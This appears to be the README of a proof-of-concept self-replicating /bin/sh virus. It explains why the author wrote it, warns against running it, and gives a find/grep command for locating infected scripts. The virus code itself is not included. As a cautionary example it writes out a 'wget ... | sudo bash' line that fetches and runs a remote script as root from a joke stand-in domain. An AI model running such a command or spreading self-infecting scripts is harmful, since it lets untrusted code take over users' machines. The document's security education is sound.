# shell-virus-poc
Proof-of-Concept /bin/sh virus

!! DO NOT RUN THIS SCRIPT !!

!! FOR EDUCATIONAL USE ONLY !!

## What ##
This a short one-liner that will search and infect one other /bin/sh-script with itself.

## Why ##
While having a discussion about hardening a Linux server, making it more secure, a question was raised:
````
"Why can't you just remove all commands that will allow you to do something dangerous?"
````
My reply was:
````
"That is basically impossible, you could write a virus with just ls and grep."
````
Turned out I was wrong, you need ed, find, grep and head.

A more serious reason is to show that Linux is not, in any way, immune to viruses or malicious code. While package repositories that comes with your distribution most likely is safe, and the system at school/work where an administrator takes care of your system and you won't be able to do much more harm than to remove your own files, many people have Linux on their laptop/desktop or a Raspberry PI they play around with with root access.

Again, repositories are usualluy safe but be careful with source-code and scripts you download and NEVER EVER do stupid things like: 

````
wget -O - http://totaly.trustworthy.domain/install_script_not_malicious_winkwink.sh | sudo bash
````

My advice is to check the code you download if possible. Never mix important data like bitcoin-wallets, personal photos and other important files on the same machine you develop on. Use containers or virtual machines when you want to try something new. And avoid sudo. Yes, I know, everyone says that you should never log in as root and use sudo for tasks that require administrator access. But people are lazy and it leads to dangerous behaviour as in the example above. I prefer opening up a separate root-shell and then not use it, unless I absolutely have to. Instead of using a semi-privileged account that can access everything anyway.

## How do I run it on my Linux server ##
Don't. Run it someone elses server.

Just kidding.

Even it the script should be harmless it is pretty annoying. If you feel a need to test it, setup a virtual machine or container. Do not ever run it on a production machine, not even "Just to see if it works".

## I didn't listen and ran it, why is it so slow ##
It tries to find a writable shell-script that is not infected, starting at /. Unless you are root it will take a while until it finds your $HOME.

## People are angry, what do I do now? ##
Change name, move to another country.

...or, to find infected scripts
````
find / -type f -exec grep -l 'ShVirus' {} \; 2>/dev/null
````
(Simply remove the second line (containing ShVirus) in all those files and you should be ok.)

